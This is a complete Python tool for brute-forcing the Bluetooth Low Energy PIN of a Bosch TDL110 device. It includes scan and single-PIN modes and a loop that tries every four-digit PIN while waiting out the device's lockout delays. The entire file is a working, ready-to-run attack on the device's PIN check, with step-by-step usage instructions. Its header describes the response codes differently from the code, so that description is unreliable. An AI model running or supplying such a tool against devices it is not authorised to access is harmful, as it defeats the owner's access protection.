#!/usr/bin/env python3
"""
Bosch TDL110 BLE PIN tester / brute-forcer
-------------------------------------------
Protocol (from Wireshark capture):
  Write handle 0x0037  (char UUID ...85e)  PIN as raw bytes: 1234 → 01 02 03 04
  Notify  handle 0x001e (char UUID ...851)  0x1e = invalid PIN, anything else = accepted

Usage:
  pip install bleak

  # Step 1: Find the device address
  python tdl110_pin.py --scan

  # Step 2: Test a single PIN
  python tdl110_pin.py --address <UUID> --pin 1234

  # Step 3: Brute-force a range
  python tdl110_pin.py --address <UUID> --brute --start 0 --end 9999
"""

import asyncio
import argparse
import sys
from bleak import BleakClient, BleakScanner

# ── UUIDs from the Wireshark capture ─────────────────────────────────────────
SERVICE_UUID    = "5d5b1447-f938-4e72-ba34-624f902fa84f"
PIN_CHAR_UUID   = "5d5b1447-f938-4e72-ba34-624f902fa85e"   # Write: send PIN here
NOTIF_CHAR_UUID = "5d5b1447-f938-4e72-ba34-624f902fa851"   # Notify: response here

# Response codes from the device
PIN_ACCEPTED       = 0x19  # PIN correct
PIN_REJECTED       = 0x16  # Wrong PIN, retry immediately
PIN_WAIT_5S        = 0x1d  # Wrong PIN, wait 5 seconds before retry
PIN_WAIT_60S       = 0x1e  # Wrong PIN, wait 60 seconds before retry

NOTIFICATION_TIMEOUT = 3.0  # seconds to wait for device response


def pin_to_bytes(pin: str) -> bytes:
    """
    Convert a numeric PIN string to the device's byte format.
    '1234' → b'\\x01\\x02\\x03\\x04'
    Each character digit becomes its integer value as a single byte.
    """
    return bytes(int(ch) for ch in pin)


# ── Scan ──────────────────────────────────────────────────────────────────────

async def scan():
    """Scan for BLE devices and list them — useful to find the TDL110 address."""
    print("Scanning for 5 seconds…")
    results = await BleakScanner.discover(timeout=5.0, return_adv=True)
    if not results:
        print("No devices found.")
        return
    print(f"\n{'Address':<40}  {'RSSI':>5}  Name")
    print("-" * 65)
    items = [(device, adv) for device, adv in results.values()]
    for device, adv in sorted(items, key=lambda x: x[1].rssi or -999, reverse=True):
        name = device.name or adv.local_name or "(unknown)"
        print(f"{device.address:<40}  {adv.rssi or '?':>5}  {name}")
    print("\nTip: use the Address value with --address to pair or test a PIN.")


# ── Single PIN test ───────────────────────────────────────────────────────────

async def test_pin(address: str, pin: str, verbose: bool = True) -> bool:
    """
    Connect, subscribe to the notification characteristic, write the PIN,
    wait for the response, and return True if the PIN was accepted.
    """
    payload = pin_to_bytes(pin)

    response_event = asyncio.Event()
    response_value: list[bytes] = []

    def on_notify(handle, data: bytearray):
        response_value.append(bytes(data))
        response_event.set()

    try:
        async with BleakClient(address, timeout=10.0) as client:
            if verbose:
                print(f"  Connected.")

            await client.start_notify(NOTIF_CHAR_UUID, on_notify)

            if verbose:
                print(f"  Writing PIN '{pin}' → {payload.hex(' ')}")
            await client.write_gatt_char(PIN_CHAR_UUID, payload, response=True)

            try:
                await asyncio.wait_for(response_event.wait(), timeout=NOTIFICATION_TIMEOUT)
            except asyncio.TimeoutError:
                print(f"  ⚠️  No notification received within {NOTIFICATION_TIMEOUT}s")
                return False

            await client.stop_notify(NOTIF_CHAR_UUID)

    except Exception as e:
        if verbose:
            print(f"  ❌ BLE error: {e}")
        return False

    raw = response_value[0] if response_value else b""
    code = raw[0] if raw else None
    accepted = code == PIN_ACCEPTED

    if verbose:
        if accepted:
            status = "✅ Accepted"
        elif code == PIN_WAIT_60S:
            status = "❌ Rejected, retry in 60 seconds"
        elif code == PIN_WAIT_5S:
            status = "❌ Rejected, retry in 5 seconds"
        else:
            status = "❌ Rejected, retry"
        print(f"  Response: {raw.hex(' ') or '(empty)'}  →  {status}")

    return accepted


# ── Brute-force ───────────────────────────────────────────────────────────────

async def brute_force(address: str, start: int, end: int, digits: int):
    """Try every numeric PIN from start to end (inclusive), reusing one connection."""
    total = end - start + 1
    print(f"Starting brute-force: {start:0{digits}d} → {end:0{digits}d}  ({total} combinations)\n")

    state: dict = {"event": asyncio.Event(), "data": b""}

    def on_notify(_handle, data: bytearray):
        state["data"] = bytes(data)
        state["event"].set()

    try:
        async with BleakClient(address, timeout=10.0) as client:
            print("  Connected.\n")
            await client.start_notify(NOTIF_CHAR_UUID, on_notify)

            for i in range(start, end + 1):
                pin = f"{i:0{digits}d}"
                payload = pin_to_bytes(pin)
                print(f"[{i - start + 1}/{total}] Trying PIN: {pin}")

                state["event"].clear()
                state["data"] = b""

                try:
                    await client.write_gatt_char(PIN_CHAR_UUID, payload, response=True)
                    await asyncio.wait_for(state["event"].wait(), timeout=NOTIFICATION_TIMEOUT)
                except asyncio.TimeoutError:
                    print(f"  ⚠️  No notification received within {NOTIFICATION_TIMEOUT}s")
                    await asyncio.sleep(62)
                    continue
                except Exception as e:
                    print(f"  ❌ BLE error: {e}")
                    return None

                raw = state["data"]
                code = raw[0] if raw else None
                accepted = code == PIN_ACCEPTED
                if accepted:
                    status = "✅ Accepted"
                elif code == PIN_WAIT_60S:
                    status = "❌ Rejected, retry in 60 seconds"
                elif code == PIN_WAIT_5S:
                    status = "❌ Rejected, retry in 5 seconds"
                else:
                    status = "❌ Rejected, retry"
                print(f"  Response: {raw.hex(' ') or '(empty)'}  →  {status}")

                if accepted:
                    print(f"\n🎉  PIN FOUND: {pin}")
                    return pin

                if code == PIN_WAIT_5S:
                    await asyncio.sleep(5)
                elif code == PIN_WAIT_60S:
                    await asyncio.sleep(60)

    except Exception as e:
        print(f"❌ Connection failed: {e}")
        return None

    print("\nBrute-force complete. No matching PIN found in the specified range.")
    return None


# ── CLI ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Bosch TDL110 BLE PIN tester",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("--scan", action="store_true",
                        help="Scan for nearby BLE devices and exit")
    parser.add_argument("--address", metavar="ADDR",
                        help="BLE address / CoreBluetooth UUID of the TDL110")
    parser.add_argument("--pin",
                        help="Single PIN to test (e.g. 1234)")
    parser.add_argument("--brute", action="store_true",
                        help="Brute-force PINs from --start to --end")
    parser.add_argument("--start", type=int, default=0,
                        help="Start of brute-force range (default: 0)")
    parser.add_argument("--end", type=int, default=9999,
                        help="End of brute-force range (default: 9999)")
    parser.add_argument("--digits", type=int, default=4,
                        help="PIN digit width for zero-padding (default: 4)")
    args = parser.parse_args()

    if args.scan:
        asyncio.run(scan())
        sys.exit(0)

    if not args.address:
        parser.error("--address is required unless using --scan")

    if args.pin:
        accepted = asyncio.run(test_pin(args.address, args.pin))
        sys.exit(0 if accepted else 1)

    if args.brute:
        result = asyncio.run(brute_force(args.address, args.start, args.end, args.digits))
        sys.exit(0 if result else 1)

    parser.print_help()


if __name__ == "__main__":
    main()